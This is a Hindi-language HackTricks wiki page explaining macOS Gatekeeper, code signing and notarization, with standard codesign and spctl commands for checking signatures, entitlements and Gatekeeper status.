# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **cybersecurity company** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **company рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **Join the** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter рдкрд░** рдореБрдЭреЗ **follow** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреА hacking tricks рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

**Gatekeeper** рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ Mac рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд╕рд┐рдд рдХреА рдЧрдИ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХреЗрд╡рд▓ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЪрд▓рд╛рдПрдВ**ред рдпрд╣ **рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХрд╛ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рджреНрд╡рд╛рд░рд╛ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ App Store рдХреЗ **рдмрд╛рд╣рд░реА рд╕реНрд░реЛрддреЛрдВ рд╕реЗ** рдЦреЛрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рдРрдк, рдкреНрд▓рдЧ-рдЗрди, рдпрд╛ рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдкреИрдХреЗрдЬред

Gatekeeper рдХреА рдореБрдЦреНрдп рддрдВрддреНрд░ рдЗрд╕рдХреА **рд╕рддреНрдпрд╛рдкрди** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдирд┐рд╣рд┐рдд рд╣реИред рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ **рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рдбреЗрд╡рд▓рдкрд░ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реИ** рдпрд╛ рдирд╣реАрдВ, рдЬрд┐рд╕рд╕реЗ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддреА рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рдпрд╣ рднреА рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ **Apple рджреНрд╡рд╛рд░рд╛ рдиреЛрдЯрд░рд╛рдЗрдЬреНрдб рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдкреБрд╖реНрдЯрд┐ рд╣реЛрддреА рд╣реИ рдХрд┐ рдЗрд╕рдореЗрдВ рдЬреНрдЮрд╛рдд рдореИрд▓рд╡реЗрдпрд░ рд╕рд╛рдордЧреНрд░реА рдирд╣реАрдВ рд╣реИ рдФрд░ рдиреЛрдЯрд░рд╛рдЗрдЬреЗрд╢рди рдХреЗ рдмрд╛рдж рдЗрд╕рдореЗрдВ рдХреЛрдИ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, Gatekeeper рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдпрдВрддреНрд░рдг рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдордЬрдмреВрдд рдХрд░рддрд╛ рд╣реИ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреЛ рдЦреЛрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░рдХреЗ**ред рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреЛрдб рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рд╡реЗ рд╣рд╛рдирд┐рд░рд╣рд┐рдд рдбреЗрдЯрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдЧрд▓рддреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рдЬрд┐рдиреНрд╣реЗрдВ рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рднреА рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, Apple рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдЕрд╡рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдШрдЯрдХ рд╣реИрдВред рдЗрдирдХрд╛ рдЙрдкрдпреЛрдЧ **рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд▓реЗрдЦрдХ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ** (рдбреЗрд╡рд▓рдкрд░) рдФрд░ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреЛрдб рдХреЛ рдЕрдВрддрд┐рдо рдмрд╛рд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рд╕реЗ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИред

рдпрд╣рд╛рдБ рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ:

1. **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рдирд╛:** рдЬрдм рдПрдХ рдбреЗрд╡рд▓рдкрд░ рдЕрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реЛрддрд╛ рд╣реИ, рд╡реЗ **рдПрдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ**ред рдпрд╣ рдирд┐рдЬреА рдХреБрдВрдЬреА рдПрдХ **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рдЬреБрдбрд╝реА рд╣реЛрддреА рд╣реИ рдЬреЛ Apple рдбреЗрд╡рд▓рдкрд░ рдХреЛ рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИ** рдЬрдм рд╡реЗ Apple Developer Program рдореЗрдВ рдирд╛рдорд╛рдВрдХрди рдХрд░рддреЗ рд╣реИрдВред рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдРрдк рдХреЗ рд╕рднреА рднрд╛рдЧреЛрдВ рдХрд╛ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ рд╣реИрд╢ рдмрдирд╛рдирд╛ рдФрд░ рдЗрд╕ рд╣реИрд╢ рдХреЛ рдбреЗрд╡рд▓рдкрд░ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред
2. **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рд╡рд┐рддрд░рдг:** рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдлрд┐рд░ рдбреЗрд╡рд▓рдкрд░ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рдВрдмрдВрдзрд┐рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИред
3. **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдирд╛:** рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рдЙрдирдХрд╛ Mac рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдбреЗрд╡рд▓рдкрд░ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕реЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░ рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рд╡рд░реНрддрдорд╛рди рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╣реИрд╢ рдХреА рдкреБрдирдГ рдЧрдгрдирд╛ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рд╣реИрд╢ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИред рдЕрдЧрд░ рд╡реЗ рдореЗрд▓ рдЦрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХреЛрдИ рдмрджрд▓рд╛рд╡ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдбреЗрд╡рд▓рдкрд░ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ Apple рдХреЗ Gatekeeper рддрдХрдиреАрдХ рдХрд╛ рдПрдХ рдЕрдирд┐рд╡рд╛рд░реНрдп рд╣рд┐рд╕реНрд╕рд╛ рд╣реИрдВред рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЦреЛрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, Gatekeeper рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИред рдЕрдЧрд░ рдпрд╣ Apple рджреНрд╡рд╛рд░рд╛ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реИ рдФрд░ рдХреЛрдб рдореЗрдВ рдХреЛрдИ рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИ, рддреЛ Gatekeeper рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЕрдиреНрдпрдерд╛, рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рддрд░реНрдХ рдХрд░рддрд╛ рд╣реИред

macOS Catalina рд╕реЗ рд╢реБрд░реВ рдХрд░рдХреЗ, **Gatekeeper рдпрд╣ рднреА рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ Apple рджреНрд╡рд╛рд░рд╛ рдиреЛрдЯрд░рд╛рдЗрдЬреНрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдпрд╛ рдирд╣реАрдВ, рдЬрд┐рд╕рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдкрд░рдд рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИред рдиреЛрдЯрд░рд╛рдЗрдЬреЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЛрдВ рдФрд░ рдореИрд▓рд╡реЗрдпрд░ рдХреЛрдб рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрддреА рд╣реИ, рдФрд░ рдЕрдЧрд░ рдпреЗ рдЬрд╛рдВрдЪ рдкрд╛рд╕ рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ, рддреЛ Apple рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдЯрд┐рдХрдЯ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ Gatekeeper рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рдЬрдм рдЖрдк рдХрд┐рд╕реА **malware sample** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣реЗ рд╣реЛрдВ, рддреЛ рдЖрдкрдХреЛ рд╣рдореЗрд╢рд╛ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП** рдХреНрдпреЛрдВрдХрд┐ **рдбреЗрд╡рд▓рдкрд░** рдЬрд┐рд╕рдиреЗ рдЗрд╕реЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд┐рдпрд╛ рд╣реЛ, рд╡рд╣ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **malware рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд** рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the appтАЩs contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### рдиреЛрдЯрд░реАрдХрд░рдг

Apple рдХреА рдиреЛрдЯрд░реАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд╕реЗ рдмрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддреА рд╣реИред рдЗрд╕рдореЗрдВ **рдбреЗрд╡рд▓рдкрд░ рджреНрд╡рд╛рд░рд╛ рдЙрдирдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЬрдорд╛ рдХрд░рдирд╛** рд╢рд╛рдорд┐рд▓ рд╣реИ **Apple рдХреА рдиреЛрдЯрд░реА рд╕реЗрд╡рд╛** рджреНрд╡рд╛рд░рд╛, рдЬрд┐рд╕реЗ App Review рд╕реЗ рднреНрд░рдорд┐рдд рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рд╕реЗрд╡рд╛ рдПрдХ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкреНрд░рдгрд╛рд▓реА** рд╣реИ рдЬреЛ рдЬрдорд╛ рдХрд┐рдП рдЧрдП рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА **рдореИрд▓рд┐рд╢рд╕ рдХрдВрдЯреЗрдВрдЯ** рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдФрд░ рдХреЛрдб-рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреА рд╣реИред

рдпрджрд┐ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЗрд╕ рдирд┐рд░реАрдХреНрд╖рдг рдХреЛ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЪрд┐рдВрддрд╛ рдХреЗ **рдкрд╛рд╕** рдХрд░рддрд╛ рд╣реИ, рддреЛ рдиреЛрдЯрд░реА рд╕реЗрд╡рд╛ рдПрдХ рдиреЛрдЯрд░реАрдХрд░рдг рдЯрд┐рдХрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддреА рд╣реИред рдлрд┐рд░ рдбреЗрд╡рд▓рдкрд░ рдХреЛ рдЗрд╕ рдЯрд┐рдХрдЯ рдХреЛ рдЙрдирдХреЗ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рд╕реЗ **рдЬреЛрдбрд╝рдирд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ 'рд╕реНрдЯреЗрдкрд▓рд┐рдВрдЧ' рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдиреЛрдЯрд░реАрдХрд░рдг рдЯрд┐рдХрдЯ рдХреЛ рдСрдирд▓рд╛рдЗрди рднреА рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ Gatekeeper, Apple рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА, рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреА рд╣реИред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд╣рд▓реА рдмрд╛рд░ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА рд╕реНрдерд╛рдкрдирд╛ рдпрд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рдордп, рдиреЛрдЯрд░реАрдХрд░рдг рдЯрд┐рдХрдЯ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ - рдЪрд╛рд╣реЗ рд╡рд╣ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рд╕реЗ рд╕реНрдЯреЗрдкрд▓ рдХреА рдЧрдИ рд╣реЛ рдпрд╛ рдСрдирд▓рд╛рдЗрди рдкрд╛рдИ рдЧрдИ рд╣реЛ - **Gatekeeper рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддреА рд╣реИ рдХрд┐ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреЛ Apple рджреНрд╡рд╛рд░рд╛ рдиреЛрдЯрд░реАрдХрд░рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, Gatekeeper рдкреНрд░рд╛рд░рдВрднрд┐рдХ рд▓реЙрдиреНрдЪ рдбрд╛рдпрд▓реЙрдЧ рдореЗрдВ рдПрдХ рд╡рд░реНрдгрдирд╛рддреНрдордХ рд╕рдВрджреЗрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ Apple рджреНрд╡рд╛рд░рд╛ рдореИрд▓рд┐рд╢рд╕ рдХрдВрдЯреЗрдВрдЯ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЙрдирдХреЗ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рдпрд╛ рдЪрд▓рд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдмрдврд╝рддрд╛ рд╣реИред

### GateKeeper рдХреА рдЧрдгрдирд╛ рдХрд░рдирд╛

GateKeeper рджреЛрдиреЛрдВ рд╣реИ, **рдХрдИ рд╕реБрд░рдХреНрд╖рд╛ рдШрдЯрдХ** рдЬреЛ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдкреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рднреА **рдШрдЯрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИ**ред

GateKeeper рдХреА **рд╕реНрдерд┐рддрд┐** рджреЗрдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ GateKeeper рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЬрд╛рдВрдЪ рдХреЗрд╡рд▓ **Quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓реА рдлрд╛рдЗрд▓реЛрдВ** рдкрд░ рдХреА рдЬрд╛рддреА рд╣реИ, рд╣рд░ рдлрд╛рдЗрд▓ рдкрд░ рдирд╣реАрдВред
{% endhint %}

GateKeeper рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ **рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдУрдВ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░** рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

